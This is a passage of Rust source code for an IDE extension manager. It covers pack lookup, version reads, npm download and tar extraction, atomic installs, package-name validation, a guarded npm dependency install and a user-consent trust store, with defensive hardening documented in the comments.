        let Some(spec) = m.workers.iter().find(|w| w.worker_type == worker_type) else {
            continue;
        };
        let worker_entry = spec.entry.as_deref().filter(|e| !e.is_empty())?;
        let path = safe_pack_path(&base, worker_entry)?;
        if !path.is_file() {
            return None;
        }
        return Some(WorkerDriver {
            id: m.id,
            dir: base,
            entry: worker_entry.to_string(),
        });
    }
    None
}

/// Pack-scoped [`worker_driver`]: resolve the on-disk worker entry for
/// `worker_type` **only** in the pack whose manifest id is `pack_id` (ADR 0050
/// §2). The enablement seam pins a specific `connector` pack, so its coherence
/// checks (is the worker still launchable?) must interrogate *that* pack — not
/// whichever pack first-wins the type — or duplicate worker types across packs
/// would let the type-scoped [`worker_driver`] mask an uninstalled pinned pack.
/// This keeps the seam's worker check consistent with its pack-scoped component
/// check ([`pack_component_templates`]).
pub fn worker_driver_for(pack_id: &str, worker_type: &str) -> Option<WorkerDriver> {
    let rd = std::fs::read_dir(extensions_root()).ok()?;
    for entry in rd.flatten() {
        let base = entry.path();
        let Ok(txt) = std::fs::read_to_string(base.join(manifest_name())) else {
            continue;
        };
        let Ok(m) = serde_json::from_str::<ExtManifest>(&txt) else {
            continue;
        };
        if m.id != pack_id {
            continue;
        }
        let spec = m.workers.iter().find(|w| w.worker_type == worker_type)?;
        let worker_entry = spec.entry.as_deref().filter(|e| !e.is_empty())?;
        let path = safe_pack_path(&base, worker_entry)?;
        if !path.is_file() {
            return None;
        }
        return Some(WorkerDriver {
            id: m.id,
            dir: base,
            entry: worker_entry.to_string(),
        });
    }
    None
}

/// Resolve any installed extension (lang/app/example/theme) by manifest id.
/// Used for the trust check on a project's snapshotted toolchain (approving
/// `embedded-jvm` covers Run/Compile on projects it scaffolded).
pub fn find_ext(id: &str) -> Option<ExtManifest> {
    all_extensions().into_iter().find(|e| e.id == id)
}

/// Best-effort version of the pack whose manifest id is `ext_id`, read from
/// its bundled `package.json`. Returns `None` for built-in packs (no npm
/// tarball) or when the pack dir isn't found. Used as the `scaffoldedFrom.
/// version` breadcrumb on a project — never as a run-time gate.
pub fn pack_version(ext_id: &str) -> Option<String> {
    for base in pack_dirs() {
        let Ok(txt) = std::fs::read_to_string(base.join(manifest_name())) else {
            continue;
        };
        let Ok(m) = serde_json::from_str::<ExtManifest>(&txt) else {
            continue;
        };
        if m.id != ext_id {
            continue;
        }
        let pkg = std::fs::read_to_string(base.join("package.json")).ok()?;
        let v: serde_json::Value = serde_json::from_str(&pkg).ok()?;
        return v
            .get("version")
            .and_then(|x| x.as_str())
            .filter(|s| !s.is_empty())
            .map(String::from);
    }
    None
}

/// The npm package **name** of the installed pack whose manifest id is `ext_id`,
/// read from its bundled `package.json`. Mirror of [`pack_version`] (same scan,
/// different field). Returns `None` for built-in packs (no tarball / no
/// `package.json`) or when the pack dir isn't found. Used to resolve the npm
/// spec (`<name>@<version>`) when fetching the 3-way merge base of a project
/// update.
pub fn pack_npm_name(ext_id: &str) -> Option<String> {
    for base in pack_dirs() {
        let Ok(txt) = std::fs::read_to_string(base.join(manifest_name())) else {
            continue;
        };
        let Ok(m) = serde_json::from_str::<ExtManifest>(&txt) else {
            continue;
        };
        if m.id != ext_id {
            continue;
        }
        let pkg = std::fs::read_to_string(base.join("package.json")).ok()?;
        let v: serde_json::Value = serde_json::from_str(&pkg).ok()?;
        return v
            .get("name")
            .and_then(|x| x.as_str())
            .filter(|s| !s.is_empty())
            .map(String::from);
    }
    None
}

/// Map every installed pack's manifest id to its `package.json` version in a
/// single scan of the extensions store — the batch form of [`pack_version`].
/// Callers that need the installed version for *many* packs (e.g.
/// [`list_projects`](super::projects::list_projects) deciding `update_available`
/// per project) build this once instead of re-scanning the whole store per
/// lookup, turning an O(projects × packs) refresh into O(projects + packs).
/// First-writer-wins on an id collision, matching `pack_version`'s first-match
/// resolution over the sorted `pack_dirs()`.
pub fn installed_pack_versions() -> std::collections::HashMap<String, String> {
    let mut map = std::collections::HashMap::new();
    for base in pack_dirs() {
        let Ok(txt) = std::fs::read_to_string(base.join(manifest_name())) else {
            continue;
        };
        let Ok(m) = serde_json::from_str::<ExtManifest>(&txt) else {
            continue;
        };
        let Ok(pkg) = std::fs::read_to_string(base.join("package.json")) else {
            continue;
        };
        let Ok(v) = serde_json::from_str::<serde_json::Value>(&pkg) else {
            continue;
        };
        if let Some(ver) = v
            .get("version")
            .and_then(|x| x.as_str())
            .filter(|s| !s.is_empty())
        {
            map.entry(m.id).or_insert_with(|| ver.to_string());
        }
    }
    map
}

/// Shared `npm pack <pkg_spec>` + `tar xzf --strip-components=1` core used by
/// both [`install_from_npm`] and [`pack_into_tmp`]. Runs `npm pack` inside
/// `dir` (fetching the tarball there), extracts it in place, and removes the
/// tarball, leaving only the package's own files. Keeping this one place means
/// the security-sensitive extraction flags (`--strip-components=1`) and cleanup
/// can't drift between the two callers. Does NOT create or clean up `dir` on
/// error — the caller owns `dir`'s lifecycle. Best-effort: requires `npm` and
/// `tar` on PATH.
fn npm_pack_extract(dir: &Path, pkg_spec: &str) -> Result<(), String> {
    let tgz = npm_pack_download(dir, pkg_spec)?;
    let tar = find_program("tar").ok_or("tar not found")?;
    let st = std::process::Command::new(&tar)
        .args(["xzf", &tgz, "--strip-components=1"])
        .current_dir(dir)
        .status()
        .map_err(|e| format!("tar: {e}"))?;
    if !st.success() {
        return Err("tar extract failed".into());
    }
    let _ = std::fs::remove_file(dir.join(&tgz));
    Ok(())
}

/// Run `npm pack <pkg_spec>` inside `dir`, fetching the tarball there, and
/// return the created `.tgz` filename (relative to `dir`). Does **not** extract
/// or remove it — the caller owns the tarball's lifecycle. Split out of
/// [`npm_pack_extract`] as the single `npm pack` invocation both it and callers
/// that only need one member (e.g. [`fetch_published_changelog`]) share, so the
/// download step can't drift between them. Requires `npm` on PATH.
fn npm_pack_download(dir: &Path, pkg_spec: &str) -> Result<String, String> {
    let npm = find_program("npm").ok_or("npm not found on PATH")?;
    let out = std::process::Command::new(&npm)
        .args(["pack", pkg_spec, "--silent"])
        .current_dir(dir)
        .output()
        .map_err(|e| format!("npm pack: {e}"))?;
    if !out.status.success() {
        return Err(format!(
            "npm pack failed: {}",
            String::from_utf8_lossy(&out.stderr)
        ));
    }
    Ok(String::from_utf8_lossy(&out.stdout).trim().to_string())
}

/// Hard cap on how many bytes we buffer from a single tar member. The tarballs
/// this reads come from an untrusted registry, so an extremely large member
/// (e.g. a pathological `CHANGELOG.md`) would otherwise balloon memory and the
/// JSON response — a resource-exhaustion vector. 4 MiB dwarfs any real changelog
/// while keeping a hostile input bounded; a member past the cap is treated as
/// unreadable (`None`).
const MAX_TAR_MEMBER_BYTES: u64 = 4 * 1024 * 1024;

/// Stream a single named member out of the gzip tarball `tgz` (relative to
/// `dir`) to memory via `tar -xzO -f <tgz> <member>`, writing **no** archive
/// paths to the filesystem. `None` when the member is absent, `tar` is missing
/// or fails, the member exceeds [`MAX_TAR_MEMBER_BYTES`], or the bytes are not
/// valid UTF-8. Reading just the one file we need is a smaller attack surface
/// (and less I/O) than unpacking a whole untrusted registry archive to disk, and
/// the byte cap keeps a hostile oversized member from exhausting memory: stdout
/// is streamed with a hard limit rather than captured whole via `output()`.
fn tar_read_member(dir: &Path, tgz: &str, member: &str) -> Option<String> {
    use std::io::Read;
    let tar = find_program("tar")?;
    let mut child = std::process::Command::new(&tar)
        .args(["xzOf", tgz, member])
        .current_dir(dir)
        .stdout(std::process::Stdio::piped())
        .stderr(std::process::Stdio::null())
        .spawn()
        .ok()?;
    let mut stdout = child.stdout.take()?;
    // Read one byte past the cap so an over-limit member is detectable without
    // ever buffering the whole thing.
    let mut buf = Vec::new();
    let read = stdout
        .by_ref()
        .take(MAX_TAR_MEMBER_BYTES + 1)
        .read_to_end(&mut buf)
        .is_ok();
    if !read || buf.len() as u64 > MAX_TAR_MEMBER_BYTES {
        // Read error or over the cap: stop `tar` (rather than draining a
        // pathologically large member) and treat it as unreadable.
        let _ = child.kill();
        let _ = child.wait();
        return None;
    }
    // The member fit under the cap, so its stdout is at EOF and `tar` has
    // finished; reap it and honour its exit status.
    if !child.wait().ok()?.success() {
        return None;
    }
    String::from_utf8(buf).ok()
}

/// Create a fresh, uniquely-named temp directory under the system temp root
/// using *exclusive* creation (`create_dir`, not `create_dir_all`): a
/// pre-existing entry at the target — including an attacker-planted symlink or
/// directory on a shared multi-user host — makes creation fail rather than
/// letting us write through it, which defuses the classic predictable-temp-dir
/// TOCTOU/symlink race. The name mixes the pid, a high-resolution timestamp and
/// OS-seeded randomness (`RandomState` is seeded from the platform CSPRNG on
/// construction), and we retry on the rare `AlreadyExists` collision. Callers
/// are responsible for removing the returned directory.
pub fn secure_temp_dir(prefix: &str) -> std::io::Result<PathBuf> {
    use std::hash::{BuildHasher, Hasher};
    let base = std::env::temp_dir();
    let mut last_err: Option<std::io::Error> = None;
    for _ in 0..64 {
        let nanos = std::time::SystemTime::now()
            .duration_since(std::time::UNIX_EPOCH)
            .map(|d| d.as_nanos())
            .unwrap_or(0);
        // A fresh `RandomState` each iteration is seeded from the OS CSPRNG, so
        // its hasher yields an unpredictable 64-bit value with no input.
        let rand = std::collections::hash_map::RandomState::new()
            .build_hasher()
            .finish();
        let candidate = base.join(format!(
            "{prefix}-{}-{nanos}-{rand:016x}",
            std::process::id()
        ));
        match std::fs::create_dir(&candidate) {
            Ok(()) => return Ok(candidate),
            Err(e) if e.kind() == std::io::ErrorKind::AlreadyExists => {
                last_err = Some(e);
                continue;
            }
            Err(e) => return Err(e),
        }
    }
    Err(last_err.unwrap_or_else(|| {
        std::io::Error::new(
            std::io::ErrorKind::AlreadyExists,
            "could not create a unique temp dir",
        )
    }))
}

/// `npm pack <pkg_spec>` + extract into a fresh temp dir, returning the
/// extracted package root. Unlike [`install_from_npm`], this NEVER touches the
/// pack store (`safe_pkg_dir`) — it materialises a throwaway copy (e.g. an old
/// pack version fetched as a 3-way merge base) that the caller cleans up. No
/// dependency install is run (base/overlay comparison only needs the pack's own
/// files). `pkg_spec` accepts `name`, `name@version`, or `@scope/name@version`.
/// Best-effort: requires `npm` and `tar` on PATH.
pub fn pack_into_tmp(pkg_spec: &str) -> Result<PathBuf, String> {
    let dir = secure_temp_dir("nano-pack").map_err(|e| format!("mkdir: {e}"))?;
    // Throwaway dir: tear it down on any failure so a partial extract never
    // leaks into the temp root.
    if let Err(e) = npm_pack_extract(&dir, pkg_spec) {
        let _ = std::fs::remove_dir_all(&dir);
        return Err(e);
    }
    Ok(dir)
}
/// 0033 §4): resolves each of its manifest `components` paths against the pack
/// dir, parses the JSON (a single template or an array), and returns every
/// element-template-looking entry (a string `id` + a non-empty `appliesTo`).
/// Path-escaping paths, missing files, and malformed JSON are skipped so a bad
/// pack never blanks the palette. Built-in packs (no on-disk dir) yield nothing.
pub fn pack_component_templates(ext_id: &str) -> Vec<serde_json::Value> {
    for base in pack_dirs() {
        let Ok(txt) = std::fs::read_to_string(base.join(manifest_name())) else {
            continue;
        };
        let Ok(m) = serde_json::from_str::<ExtManifest>(&txt) else {
            continue;
        };
        if m.id != ext_id {
            continue;
        }
        let mut out = Vec::new();
        for rel in &m.components {
            let Some(path) = safe_pack_path(&base, rel) else {
                continue;
            };
            let Ok(body) = std::fs::read_to_string(&path) else {
                continue;
            };
            let Ok(parsed) = serde_json::from_str::<serde_json::Value>(&body) else {
                continue;
            };
            match parsed {
                serde_json::Value::Array(items) => {
                    out.extend(items.into_iter().filter(is_element_template));
                }
                v if is_element_template(&v) => out.push(v),
                _ => {}
            }
        }
        return out;
    }
    vec![]
}

/// Whether a JSON value looks like a Zeebe element template: a string `id` and a
/// non-empty `appliesTo` array. Loose on purpose — the console's
/// `elementTemplates.set()` runs the authoritative schema validation; this only
/// screens obviously-unrelated JSON so one stray file can't poison the set.
fn is_element_template(v: &serde_json::Value) -> bool {
    v.get("id").and_then(|x| x.as_str()).is_some()
        && v.get("appliesTo")
            .and_then(|x| x.as_array())
            .is_some_and(|a| !a.is_empty())
}

/// Joins a pack-relative path to the pack `base`, rejecting absolute paths and
/// any `..`/root/prefix component so a manifest can't read files outside its own
/// dir (the same containment rule the project file API enforces).
fn safe_pack_path(base: &std::path::Path, rel: &str) -> Option<PathBuf> {
    let candidate = std::path::Path::new(rel);
    if candidate
        .components()
        .all(|c| matches!(c, std::path::Component::Normal(_)))
    {
        Some(base.join(candidate))
    } else {
        None
    }
}

/// Locate the on-disk source dir for a scaffold template contributed by an
/// installed pack: `templates/<template_id>` for lang/app packs, or the
/// example's `appDir`. Returns (manifest, dir) so the scaffolder can copy it.
pub fn template_source(template_id: &str) -> Option<(ExtManifest, PathBuf)> {
    for base in pack_dirs() {
        // The extensions root holds more than pack dirs — the trust store
        // (trust.json), OS litter (.DS_Store), a mid-install tarball. Skip
        // anything without a readable manifest instead of aborting the scan:
        // a `?` here let the FIRST such entry hide every installed template
        // (the picker still offered them via the tolerant all_extensions(),
        // but creation silently fell back to the built-in Deno starter).
        let txt = match std::fs::read_to_string(base.join(manifest_name())) {
            Ok(t) => t,
            Err(_) => continue,
        };
        let m: ExtManifest = match serde_json::from_str(&txt) {
            Ok(m) => m,
            Err(_) => continue,
        };
        if m.kind == ExtKind::Example && m.id == template_id {
            let dir = base.join(m.app_dir.clone().unwrap_or_else(|| "app".into()));
            if dir.is_dir() {
                return Some((m, dir));
            }
        }
        if m.templates.iter().any(|t| t.id == template_id) {
            let dir = base.join("templates").join(template_id);
            if dir.is_dir() {
                return Some((m, dir));
            }
        }
    }
    None
}

/// Locate the scaffold template dir for `template_id` **within an arbitrary
/// pack root** (e.g. a version fetched by [`pack_into_tmp`]), rather than
/// scanning the installed pack store like [`template_source`]. Same resolution
/// rule: an example pack's `appDir`, or `templates/<template_id>` for a
/// lang/app pack. Returns `None` when the root has no readable manifest or the
/// resolved dir is absent.
pub fn template_dir_in_root(root: &Path, template_id: &str) -> Option<PathBuf> {
    let txt = std::fs::read_to_string(root.join(manifest_name())).ok()?;
    let m: ExtManifest = serde_json::from_str(&txt).ok()?;
    if m.kind == ExtKind::Example && m.id == template_id {
        let dir = root.join(m.app_dir.clone().unwrap_or_else(|| "app".into()));
        if dir.is_dir() {
            return Some(dir);
        }
    }
    if m.templates.iter().any(|t| t.id == template_id) {
        let dir = root.join("templates").join(template_id);
        if dir.is_dir() {
            return Some(dir);
        }
    }
    None
}

/// Recursively copy a pack template dir into a project dir.
pub fn copy_tree(src: &PathBuf, dst: &PathBuf) -> std::io::Result<()> {
    std::fs::create_dir_all(dst)?;
    for entry in std::fs::read_dir(src)? {
        let entry = entry?;
        let from = entry.path();
        let to = dst.join(entry.file_name());
        if from.is_dir() {
            copy_tree(&from, &to)?;
        } else {
            std::fs::copy(&from, &to)?;
        }
    }
    Ok(())
}

// ---------------------------------------------------------------------------
// Trust store — allowlist + consent (ADR 0007)
// ---------------------------------------------------------------------------

/// Persisted consent: a global yolo bypass plus per-extension approve-always.
#[derive(Clone, Default, Serialize, Deserialize)]
#[serde(rename_all = "camelCase")]
pub struct TrustStore {
    #[serde(default)]
    pub yolo: bool,
    #[serde(default)]
    pub approved: BTreeSet<String>,
}

fn trust_path() -> PathBuf {
    extensions_root().join("trust.json")
}

pub fn load_trust() -> TrustStore {
    std::fs::read_to_string(trust_path())
        .ok()
        .and_then(|t| serde_json::from_str(&t).ok())
        .unwrap_or_default()
}

pub fn save_trust(t: &TrustStore) -> std::io::Result<()> {
    std::fs::create_dir_all(extensions_root())?;
    let json = serde_json::to_string_pretty(t).unwrap_or_else(|_| "{}".into());
    std::fs::write(trust_path(), format!("{json}\n"))
}

/// Whether a pack's out-of-process code — a `lang`/`app` toolchain command, or
/// a `trigger`/connector driver/worker child — may run without prompting.
pub fn is_trusted(id: &str) -> bool {
    let t = load_trust();
    t.yolo || t.approved.contains(id) || builtin_ids().contains(id)
}

fn builtin_ids() -> BTreeSet<String> {
    builtin_extensions().into_iter().map(|e| e.id).collect()
}

/// Whether a **freshly downloaded** marketplace pack may run npm lifecycle
/// scripts during its guarded dependency install ([`install_pack_deps`]).
///
/// Pure over an explicit [`TrustStore`] so the supply-chain policy is unit
/// testable without a live trust file. Unlike [`is_trusted`], it deliberately
/// omits the built-in-id shortcut: a pack fetched from npm is by definition
/// **not** one of the bundled built-ins, so honouring a self-declared built-in
/// id here would let any third-party pack spoof a built-in id (e.g. `deno`) in
/// its manifest and gain implicit trust to execute arbitrary install scripts.
/// Trust therefore comes only from explicit user consent — the global `yolo`
/// bypass or a prior approve-always of this exact pack id.
fn install_scripts_trusted(trust: &TrustStore, id: &str) -> bool {
    trust.yolo || trust.approved.contains(id)
}

// ---------------------------------------------------------------------------
// Install / remove
// ---------------------------------------------------------------------------

fn safe_pkg_dir(pkg: &str) -> Option<PathBuf> {
    // Trim once here so validation and flattening operate on the *same*
    // canonical string — otherwise a caller that passed untrimmed input could
    // validate one string but flatten another (a validator/flatten mismatch).
    let pkg = pkg.trim();
    if !is_valid_pkg_name(pkg) {
        return None;
    }
    // npm package -> safe dir name (`@scope/name` -> `scope__name`). The
    // security property this flatten guarantees is *path confinement*, not
    // injectivity: because `is_valid_pkg_name` already pinned the raw shape
    // (unscoped = no `/`; scoped = exactly one `/`, no traversal, npm alphabet),
    // no input can fold a local path spec (`/etc`, `some/local/path`, `..`) into
    // a bare dir name — the result is always a single component under
    // `extensions_root()`. It is *not* injective: a scoped `@scope/name` and an
    // unscoped package literally named `scope__name` both map here to
    // `scope__name`. That is an accepted limitation, not a path-escape bug — the
    // dir is a content store addressed by the validated package name (install
    // and remove use the *same* mapping, so a given name always round-trips to
    // its own dir), and packs are identified downstream by their manifest `id`,
    // never by this directory name.
    let flat = pkg.trim_start_matches('@').replace('/', "__");
    Some(extensions_root().join(flat))
}

/// Whether `pkg` is a syntactically valid npm package **name** we will accept
/// from untrusted input. The single gate shared by [`safe_pkg_dir`] (which maps
/// it to an install dir) and [`fetch_published_changelog`] (which builds an
/// `npm pack` registry spec): it blocks non-registry specifiers such as
/// `../local-path`, `/etc`, `some/local/path`, `file:/…`, or a URL from ever
/// reaching `npm pack` — those could otherwise be abused to pack/read local
/// directories or trigger arbitrary fetches.
///
/// It validates the **raw** name shape, not the flattened dir name: an unscoped
/// name has **no** `/`; a scoped name is exactly `@scope/name` with a **single**
/// `/`. Validating the flattened form (`/` -> `__`) would wrongly accept local
/// path specs like `/etc` or `some/local/path`, since the slashes vanish before
/// the alphabet check.
fn is_valid_pkg_name(pkg: &str) -> bool {
    // A single npm name segment (scope or name): non-empty, no path traversal,
    // restricted to the npm name alphabet, and — like npm itself — never
    // starting with `.` or `_`. Blocking a leading `.`/`_` keeps `safe_pkg_dir`
    // from mapping a crafted name to a dotfile or, worse, to the extensions
    // root itself: `.` alone would otherwise flatten to `extensions_root()/.`
    // (the root), letting `install_from_npm`/`remove` overwrite or delete the
    // whole extensions directory.
    fn is_valid_segment(seg: &str) -> bool {
        !seg.is_empty()
            && !seg.starts_with('.')
            && !seg.starts_with('_')
            && !seg.contains("..")
            && seg
                .chars()
                .all(|c| c.is_ascii_alphanumeric() || matches!(c, '_' | '-' | '.'))
    }
    match pkg.strip_prefix('@') {
        // Scoped `@scope/name`: exactly one `/`, both segments valid.
        Some(scoped) => match scoped.split_once('/') {
            Some((scope, name)) => {
                !name.contains('/') && is_valid_segment(scope) && is_valid_segment(name)
            }
            None => false,
        },
        // Unscoped: no `/` at all.
        None => !pkg.contains('/') && is_valid_segment(pkg),
    }
}

/// Whether a version / dist-tag token is safe to interpolate into an
/// `npm pack <pkg>@<v>` spec. Restricts to the semver + dist-tag alphabet so a
/// query param can't smuggle a second spec or a non-registry source via spaces,
/// slashes, or specifier punctuation (`@`, `:`).
fn is_valid_pkg_version(v: &str) -> bool {
    !v.is_empty()
        && v.chars()
            .all(|c| c.is_ascii_alphanumeric() || matches!(c, '.' | '-' | '+' | '_'))
}

/// Install a `nano-ide-ext-*` package from npm via `npm pack` + extract. The
/// package must carry a `nano-ide.ext.json` manifest. Returns its parsed
/// manifest. Best-effort: requires `npm` on PATH.
pub fn install_from_npm(pkg: &str) -> Result<ExtManifest, String> {
    // Canonicalise the spec once so validation, the install-dir mapping, and the
    // external `npm pack` invocation all operate on the *same* string.
    // `safe_pkg_dir` trims internally, so an untrimmed `pkg` could validate/pick
    // a dir yet still be handed whitespace-padded to `npm pack` (which then
    // fails). Trimming here keeps validation and the npm call consistent.
    let pkg = pkg.trim();
    let dir = safe_pkg_dir(pkg).ok_or("invalid package name")?;
    // Build the whole new pack in a staging dir and swap it into place only once
    // it is complete + valid — so a failed fetch/extract can NEVER leave `dir`
    // half-written or empty (issue #1108). A destructive `remove_dir_all(dir)`
    // *before* the extract used to wipe a good install and, if `npm pack`/`tar`
    // then failed on a transient registry hiccup, strand an EMPTY pack dir. An
    // empty dir reads back as `installed_version == None`, which suppresses the
    // marketplace "Update" affordance (dir exists ⇒ `installed == true`, yet no
    // readable version ⇒ `update_available == false`) AND breaks the templated-
    // project update path (`installed_pack_versions` has no entry to compare).
    install_atomic(&dir, |staging| {
        npm_pack_extract(staging, pkg)?;
        let mf = staging.join(manifest_name());
        let txt = std::fs::read_to_string(&mf)
            .map_err(|_| "package has no nano-ide.ext.json".to_string())?;
        let m: ExtManifest =
            serde_json::from_str(&txt).map_err(|e| format!("bad manifest: {e}"))?;
        // Second, guarded step for packs that front an npm CLI (issue #520): an
        // `npm pack` tarball carries `package.json` but not `node_modules`, so a
        // pack whose bundled bins live in its dependencies (e.g. the
        // `nano-ide-app-urban` pack → `@nanobpm/urban`'s `urban`/`create-urban-app`)
        // must have its runtime deps installed to materialise
        // `node_modules/.bin/*`. Gated on the opt-in manifest flag so every existing
        // declaration-only pack stays a pure pack+extract with no network install.
        // Running it in the staging dir keeps the atomicity guarantee: a deps
        // failure aborts the swap and leaves the prior install untouched.
        if m.install_deps {
            // Lifecycle scripts run only for a pack the user has already trusted;
            // a freshly-installed pack is untrusted, so its install is
            // `--ignore-scripts` by default (supply-chain guardrail). npm still
            // writes the `.bin/*` shims without running scripts, so the CLI resolves.
            //
            // Trust is decided by [`install_scripts_trusted`], NOT [`is_trusted`]:
            // `m.id` is self-declared by the just-downloaded manifest, and
            // `is_trusted` treats any built-in id as trusted — so a third-party pack
            // could spoof a built-in id (e.g. `deno`) to gain implicit trust and run
            // arbitrary npm lifecycle scripts. A pack fetched from npm is by
            // definition never a bundled built-in, so that shortcut must not apply
            // here; only explicit consent (yolo / a prior approve of this id) counts.
            install_pack_deps(staging, install_scripts_trusted(&load_trust(), &m.id))?;
        }
        Ok(m)
    })
}

/// Atomically (re)install the pack directory `dest`: run `build` against a
/// freshly-created *staging* sibling dir and swap it into place only if `build`
/// succeeds. On ANY failure (or panic-free error return) the previous contents
/// of `dest` are left intact — never half-written, never empty (issue #1108).
///
/// The swap is a same-filesystem `rename`, so staging and backup are created as
/// siblings of `dest` under the extensions root. Sequence:
///   1. build the new pack in `staging`; on error, drop `staging`, leave `dest`.
///   2. move any existing `dest` aside to `backup`.
///   3. `rename(staging → dest)`. On failure, restore `backup → dest`.
///   4. drop `backup`.
///
/// The staging/backup names are dot-prefixed and carry pid + a nanosecond stamp
/// so concurrent installs of the same pack can't collide on the scratch dirs and
/// the marketplace scan ([`pack_dirs`], which skips leading-dot entries) ignores
/// them in flight.
fn install_atomic<T>(
    dest: &Path,
    build: impl FnOnce(&Path) -> Result<T, String>,
) -> Result<T, String> {
    let parent = dest.parent().ok_or("invalid install dir")?;
    let leaf = dest
        .file_name()
        .map(|s| s.to_string_lossy().into_owned())
        .ok_or("invalid install dir")?;
    std::fs::create_dir_all(parent).map_err(|e| format!("mkdir: {e}"))?;
    let uniq = format!(
        "{}.{}",
        std::process::id(),
        std::time::SystemTime::now()
            .duration_since(std::time::UNIX_EPOCH)
            .map(|d| d.as_nanos())
            .unwrap_or(0)
    );
    let staging = parent.join(format!(".{leaf}.staging.{uniq}"));
    let backup = parent.join(format!(".{leaf}.backup.{uniq}"));
    // Start from a clean staging dir (a stale one from a crashed prior run must
    // not leak into the new pack).
    let _ = std::fs::remove_dir_all(&staging);
    std::fs::create_dir_all(&staging).map_err(|e| format!("mkdir staging: {e}"))?;

    let out = match build(&staging) {
        Ok(v) => v,
        Err(e) => {
            let _ = std::fs::remove_dir_all(&staging);
            return Err(e);
        }
    };

    // Swap staging into place, keeping the old copy as a backup until the new one
    // is committed so a mid-swap failure can be rolled back.
    let _ = std::fs::remove_dir_all(&backup);
    let had_prev = dest.exists();
    if had_prev && let Err(e) = std::fs::rename(dest, &backup) {
        let _ = std::fs::remove_dir_all(&staging);
        return Err(format!("stage backup: {e}"));
    }
    if let Err(e) = std::fs::rename(&staging, dest) {
        // Roll back to the previous install so a failed swap never empties `dest`.
        // Surface whether the rollback itself succeeded: if restoring `backup →
        // dest` also fails, `dest` is now MISSING and the prior install is
        // stranded in `backup` — the operator must recover it, so we keep
        // `backup` on disk and name it in the error rather than swallowing the
        // second failure and reporting a bare, misleading commit error.
        let _ = std::fs::remove_dir_all(&staging);
        if had_prev && let Err(re) = std::fs::rename(&backup, dest) {
            return Err(format!(
                "commit install: {e}; rollback failed: {re}; prior install \
                 preserved at {}",
                backup.display()
            ));
        }
        return Err(format!("commit install: {e}"));
    }
    let _ = std::fs::remove_dir_all(&backup);
    Ok(out)
}

/// The npm package name of the first-party Urban App marketplace pack (issue
/// #520). Its `package.json` depends on `@nanobpm/urban` (the `urban` CLI) and
/// `create-urban-app` (the scaffolder #522 delegates to), so once the pack is
/// installed **with its deps** (`install_deps: true`) the Studio's Urban
/// toolchain lives at `<pack>/node_modules/.bin/{urban,create-urban-app}`.
///
/// Scoped `@nanobpm/` like every published pack (`nano-ide-app-workflow`,
/// `nano-ide-app-embedded-nano`, …): the marketplace flags a pack **official**
/// only when its name carries that scope (see [`is_official`]), and the whole
/// `@nanobpm/nano-ide-{lang,app,example,…}-*` namespace is scoped. This settles
/// ADR 0052 Q4 in line with the live registry. [`safe_pkg_dir`] maps it to the
/// directory `nanobpm__nano-ide-app-urban`; both the installer here and the
/// resolver in [`super::urban`] derive that dir from *this* constant, so the
/// install target and the lookup target stay the *same* path with no second
/// spelling to drift.
pub const URBAN_PACK_PKG: &str = "@nanobpm/nano-ide-app-urban";

/// Public spelling of [`safe_pkg_dir`]: the on-disk install directory of a
/// marketplace pack given its npm package name, or `None` for a name that fails
/// validation. Lets callers outside this module (e.g. the `urban` resolver, the
/// install-before-create flow) agree on a pack's location without re-deriving
/// the `@scope/name → scope__name` mapping.
pub fn pack_install_dir(pkg: &str) -> Option<PathBuf> {
    safe_pkg_dir(pkg)
}

/// Build the argv for the guarded pack-dependency install (issue #520). Kept
/// pure (no filesystem or process access beyond the two inputs) so the guardrail
/// policy is unit-testable without a live npm.
///
/// Policy:
/// - `ci` when a lockfile is present (reproducible, pinned), else `install`.
/// - `--omit=dev` — headless/CI installs must not pull the pack's **dev**
///   dependencies (the Urban toolkit's dev/test packages are large and
///   irrelevant to running it), addressing "don't want to pull in Urban dev
///   packages".
/// - `--ignore-scripts` unless the pack is already trusted — lifecycle scripts
///   are arbitrary code; a freshly-installed, not-yet-trusted pack must not run
///   them. The `.bin/*` shims are still written, so the toolchain resolves.
/// - `--no-audit --no-fund --loglevel=error` — quiet, no extraneous network.
fn npm_install_argv(trusted: bool, has_lockfile: bool) -> Vec<String> {
    let mut a: Vec<String> = Vec::new();
    a.push(if has_lockfile { "ci" } else { "install" }.into());
    a.push("--omit=dev".into());
    if !trusted {
        a.push("--ignore-scripts".into());
    }
    a.push("--no-audit".into());
    a.push("--no-fund".into());
    a.push("--loglevel=error".into());
    a
}

/// Run the guarded `npm install`/`npm ci` inside an already-extracted pack dir
/// to materialise its `node_modules` (issue #520). Requires `npm` on PATH.
/// `trusted` selects whether lifecycle scripts may run (see [`npm_install_argv`]).
fn install_pack_deps(dir: &Path, trusted: bool) -> Result<(), String> {
    let npm = find_program("npm").ok_or("npm not found on PATH")?;
    let has_lockfile = dir.join("package-lock.json").is_file();
    let args = npm_install_argv(trusted, has_lockfile);
    let out = std::process::Command::new(&npm)
        .args(&args)
        .current_dir(dir)
        .output()
        .map_err(|e| format!("npm install: {e}"))?;
    if !out.status.success() {
        return Err(format!(
            "npm install failed: {}",
            String::from_utf8_lossy(&out.stderr)
        ));
    }
    Ok(())
}

/// Ensure the first-party Urban toolkit is present on this host, installing the
/// [`URBAN_PACK_PKG`] marketplace pack (with its deps) if the `urban` CLI cannot
/// already be resolved (issue #520 — the "install-before-create" hook the Studio
/// calls before delegating a scaffold to `create-urban-app`, which #522 owns).
///
/// Idempotent and cheap when already satisfied: it first asks the single
/// resolver [`super::urban::urban_available`] and only shells out to npm on a
/// miss. Returns `Ok(true)` when the toolkit ends up available (already present
/// or freshly installed), `Ok(false)` if the install ran but the CLI still does
/// not resolve, and `Err` if the install itself failed.
pub fn ensure_urban_toolkit() -> Result<bool, String> {
    if super::urban::urban_available() {
        return Ok(true);
    }
    install_from_npm(URBAN_PACK_PKG)?;
    Ok(super::urban::urban_available())
}

/// Uninstall a non-builtin extension. Accepts either the npm package name
/// (e.g. `@nanobpm/nano-ide-lang-rust`) or the manifest id (`rust`) — the
/// latter is what the Console's Extensions overview payload carries, so
/// the UI's remove button uses it. Returns `Err("not installed")` if
/// neither form resolves to an installed pack directory.
pub fn remove(pkg: &str) -> Result<(), String> {
    // Accept either the npm package name (e.g. `@nanobpm/nano-ide-lang-rust`)
    // or the manifest id (`rust`). The Console's Extensions view only knows
    // the manifest id from the overview payload, so we resolve id → dir by
    // scanning installed packs when the direct lookup misses.
    let dir = safe_pkg_dir(pkg)
        .filter(|d| d.is_dir())
        .or_else(|| pack_dir_by_manifest_id(pkg))
        .ok_or_else(|| "not installed".to_string())?;
